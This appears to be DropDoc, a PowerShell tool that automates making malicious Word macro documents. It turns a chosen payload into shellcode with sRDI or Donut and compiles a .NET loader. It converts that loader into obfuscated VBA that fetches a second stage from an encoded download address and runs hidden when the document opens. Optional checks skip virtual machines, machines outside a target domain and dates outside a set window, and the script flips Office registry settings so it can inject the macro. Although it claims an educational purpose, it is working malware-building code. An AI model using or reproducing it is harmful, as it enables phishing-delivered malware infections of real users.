[cmdletbinding()]

    Param(
    
    [Parameter (Mandatory = $true, Position = 0)]
    [string] $docname
    
    )

<#
.SYNOPSIS

DropDoc - Automate the malicious MS Word Maldocs creation.

.DESCRIPTION
This Script automate the process of maldocs creation for education pourposes.

.PARAMETER docname
Final name for the maldoc.

.EXAMPLE
PS > .\DropDoc.ps1 docname


.LINK
https://tuxtrack.github.io/
https://github.com/tuxtrack/
#>


Write-Host ""'
 ·▄▄▄▄  ▄▄▄         ▄▄▄··▄▄▄▄         ▄▄· 
 ██▪ ██ ▀▄ █·▪     ▐█ ▄███▪ ██ ▪     ▐█ ▌▪
 ▐█· ▐█▌▐▀▀▄  ▄█▀▄  ██▀·▐█· ▐█▌ ▄█▀▄ ██ ▄▄
 ██. ██ ▐█•█▌▐█▌.▐▌▐█▪·•██. ██ ▐█▌.▐▌▐███▌
 ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪.▀   ▀▀▀▀▀•  ▀█▄▀▪·▀▀▀ 
      https://tuxtrack.github.io
'"" -ForegroundColor Red

$NewLine = "`n"

Function InstallationChecks{

    If ((Test-Path .\Converters\GadgetToJScript.exe) -eq $True -and (Test-Path .\Converters\Donut.exe) -eq $True )
    {
        Init
    } 
    Else
    {
        Write-Host "[+] It's the first time you've running this project" -ForegroundColor Green
        Write-Host "[+] Please compile the GadgetToJScript & Donut solution from the ""Third Party Projects"" folder." -ForegroundColor Gree
    }
    
}

Function OpsecOptions(){

    
    
    If (($checkdomain = Read-Host "[+] Would you like to check if is the computer part of a domain? Type Yes or No") -eq "Yes" )  {
        $DomainName = Read-Host "[+] Insert the Active Directory domain name"
        $global:opsec_checks = Get-Content ".\Templates\vba_opsec.txt" | Out-String
        $global:opsec_checks = $global:opsec_checks -replace "DomainName", $DomainName
    }

    ElseIf ($checkdomain -eq "No"){
        $global:opsec_checks = Get-Content ".\Templates\vba_opsec_without_domain.txt" | Out-String
    }
    
    Else {
        Write-Host "[+] Wrong option" -ForegroundColor DarkGreen
        OpsecOptions
    }
    
    $firstdate = Read-Host "[+] Insert the beginning date (mm/dd/yyyy) to malware execution"
    $lastdate = Read-Host "[+] Insert the last date (mm/dd/yyyy) to malware execution"
    $global:opsec_checks = $global:opsec_checks -replace "firstdate", $firstdate
    $global:opsec_checks = $global:opsec_checks -replace "lastdate", $lastdate
        
    Deploy
}

Function CreateDoc(){

    $link = $(Read-Host "[+] Insert the domain addr for second stage download")
    
    function ascii_to_dec($s){

        $ASCIIFirst = @{} 
        $ltrFirst = @{}

        45..90 | Foreach-Object {$ASCIIFirst.Add($_,([char]$_).ToString())
        }

        foreach($k in $ASCIIFirst.Keys){
            $ltrFirst.add($ASCIIFirst[$k],$k)
            }
                                                           
        $s.Tochararray() | % {$ltrFirst["$_"]} 
    } 
    
    $link = ascii_to_dec $link

    $link = foreach($n in $link){
        $result = "keyString($n)"
        $result
    }

    $link = $link -join " + "    

    $link = $link.replace('keyString(58)','":"').Replace('keyString(47)','"/"').replace("keyString(46)", '"."')

    $randomvar = "$(Get-Random)" + ".xml"
    
    $directory = New-Item -Path "$env:USERPROFILE\Desktop\" -Name $docname -ItemType "Directory" 

    $back = Get-Content ".\Templates\vba_download.txt" | Out-String

    . .\Converters\GadgetToJScript.exe -a $AssemblyFile -b -encodeType=hex -w vba | Out-Null

    $MacroCode = Get-Content ".\test.vba" | Out-String

    $MacroCode = $MacroCode -replace 'download', $back -replace 'hahaha', $link -replace 'randomvar', $randomvar
    
    If ($opsec -eq "Yes"){

        $MacroCode += $opsec_checks
    }

    Else {

        $Macrocode += "Private Sub Document_Open" + $NewLine
        $Macrocode += "    Set myWindow = ActiveDocument.ActiveWindow.NewWindow" + $NewLine
        $Macrocode += "    myWindow.Visible = False" + $NewLine
        $Macrocode += "        Tyrion" + $NewLine
        $Macrocode += "        Tywin" + $NewLine
        $Macrocode += "End Sub" + $NewLine
    }

    Function GetRamdomString($rsize){

        $b = -join ((65..90) + (97..122) | Get-Random -Count $rsize | % {[char]$_})
        $b
    }

    $vars = @("hexDecode","xmlObj", "nodeObj", "http", "tywin", "Backflip", "tyrion", "ObjStream", "manifesto", "stm_1", "stm_2", "fmt_1", "Decstage_1", "Decstage_2", "stage1", "stage2", "cxp1", "cxp2", "cxn", "paf", "path_1", "tt1", "tt2", "tt3", "tt4", "tt5", "UserProfile", "VmWareFileName", "VBoxFileName", "strDomain", "wshNetwork", "VmWareFileExists", "VBoxFileExists", "str_dateMin", "str_dateMax", "dateMin", "dateMax", "todayDate")

    foreach ($i in $vars)
    {
        $msize = Get-Random -Minimum 20 -Maximum 40
        $MacroCode = $MacroCode -replace $i, (GetRamdomString($msize))
    }

    $StageOne = Get-Content ".\stage-one.txt"
    $StageTwo = Get-Content ".\stage-two.txt"

    $CustomXML = Get-Content ".\Templates\InteropWord.xml"
    $CustomXML = $CustomXML -replace "stage1", $StageOne
    $CustomXML = $CustomXML -replace "stage2", $StageTwo
    $CustomXMLFile = "$env:USERPROFILE\Desktop\" + $directory.name + "\" + $randomvar
    $CustomXML | Set-Content $CustomXMLFile

    Remove-Item ".\stage-one.txt"
    Remove-Item ".\stage-two.txt"
    Remove-Item ".\test.vba"

    $Word01 = New-Object -ComObject "Word.Application"
    $WordVersion = $Word01.Version

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    $Word01.DisplayAlerts = "wdAlertsNone"
    $Word01.Visible = $false

    $Document01 = $Word01.Documents.Add()

    $WordModule = $Document01.VBProject.VBComponents(1)
    $WordModule.CodeModule.AddFromString($MacroCode)

    Add-Type -AssemblyName Microsoft.Office.Interop.Word

    $docpath = "$env:USERPROFILE\Desktop\" + $directory.name
    $Document01.SaveAs("$docpath\$($docname).doc", 0)

    For ($i = 1; $i -le 100; $i++ )
    {
        Write-Progress -Activity """Hackers Are Like Artists, Who Wake Up in the Morning in a Good Mood and Start Painting"" Putin" -Status "$i% Complete:" -PercentComplete $i
        Start-Sleep -Milliseconds 10
    }
    
    Write-Host "[+] Saved at: $docpath folder" -ForegroundColor Red

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

    $Word01.Documents.Close()
    $Word01.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word01) | out-null
    $Word01 = $Null
    
    Remove-Item $TempPath

    Remove-Item ".\loader.dll"

    Write-Output "[+] Enjoy"

    Exit

}

Function sRDI(){

    Function TestFile{
        
        $global:Malfile = Read-Host "[+] Insert the artifact path"
        
        
        If ((Test-Path $Malfile) -eq $true){}
        Else
        {    
            Write-Host "[+] File not found" -ForegroundColor DarkGreen
            TestFile
        }
    }
     
    TestFile

    Write-Host "[+] Converting $MalFile in shellcode using sRDI"

    . .\Converters\ConvertTo-Shellcode.ps1

    $scode = ConvertTo-Shellcode $Malfile

    $CSSource = Get-Content ".\Templates\DropTemplate.cs"

    $CSSource = $CSSource -replace "//1", ""

    $CSSource = $CSSource -replace 'scode = {};', "scode = {$($scode -join ',')};"

    $TempPath = [System.IO.Path]::GetTempFileName()

    $AssemblyFile = ".\loader.dll"

    $CSSource | Set-Content $TempPath

    & 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' @(
                "/out:`"$($AssemblyFile)`"",
                '/target:library',
                "`"$($TempPath)`"",
                '/noconfig',
                '/unsafe-',
                '/nostdlib+',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Core.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.dll',
                '/optimize-'
                ) | Out-Null

    CreateDoc
}

Function Donut(){

    Function TestFile{
        
        $global:Malfile = Read-Host "[+] Insert the artifact path"
        
        
        If ((Test-Path $Malfile) -eq $true){}
        Else
        {    
            Write-Host "[+] File not found" -ForegroundColor DarkGreen
            TestFile
        }
    }
     
    TestFile
     
    Write-Host "[+] Converting $MalFile to shellcode using Donut"

    if ($MalFile -like "*.dll")
    {
        $namespace = Read-Host "[+] Insert NameSpace"
        $class = Read-Host "[+] Insert Class Name"
        $method =  Read-Host "[+] Insert Method Name"

        .\Converters\donut.exe -f $MalFile -c $($namespace + "." + $class) -m $method | Out-Null
    }
    else
    {
        .\Converters\donut.exe -f $MalFile | Out-Null
    }

    $payload = Join-Path $pwd -ChildPath "payload.bin"

    $scode = [convert]::ToBase64String([IO.File]::ReadAllBytes($payload))

    Write-Host "[+] Saving shellcode in resource file"

    $TempPath = [System.IO.Path]::GetTempFileName() + ".resx"

    $Resources = Get-Content ".\Templates\Resources.resx"

    $Resources = $Resources -replace "b64", "$scode"

    $Resources | Set-Content $TempPath

    $CSSource = Get-Content ".\Templates\DropTemplate.cs"

    $CSSource = $CSSource -replace "//2", ""

    .\Converters\ResGen.exe /useSourcePath /compile $($TempPath),replicant.Resources.resources | Out-Null

    $TempPath = [System.IO.Path]::GetTempFileName()

    $AssemblyFile = ".\loader.dll"

    $CSSource | Set-Content $TempPath


    & 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' @(
                "/out:`"$($AssemblyFile)`"",
                '/target:library',
                "`"$($TempPath)`"",
                '/noconfig',
                '/unsafe-',
                '/nostdlib+',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Core.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.dll',
                '/reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.dll'
                '/optimize-'
                '/resource:replicant.Resources.resources'
                ) | Out-Null

    Remove-Item .\replicant.Resources.resources
    Remove-Item ".\payload.bin"

    CreateDoc
}

Function Deploy(){

    $option = $(Read-Host "[+] Insert [U] for unmanaged code or [M] for managed code")

    if ($option -eq "U")
    {
        sRDI
    }
    Elseif ($option -eq "M")
    {  
        Donut
    }
    Else 
    {
        Write-Host "[+] Wrong option, try again." -ForegroundColor DarkGreen
        Deploy
    }
}

Function Init{
   
    $opsec = $(Read-Host "[+] Do you want to add OPSEC checks to you malware? Type Yes or No")
    
    if ($opsec -eq "Yes")
    {
        OpsecOptions
    }
    
    Elseif ($opsec -eq "No")
    {
        Deploy
    }    
    
    Else
    {
        Write-Host "[+] Wrong option, try again." -ForegroundColor DarkGreen
        Init
    } 
}

InstallationChecks                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        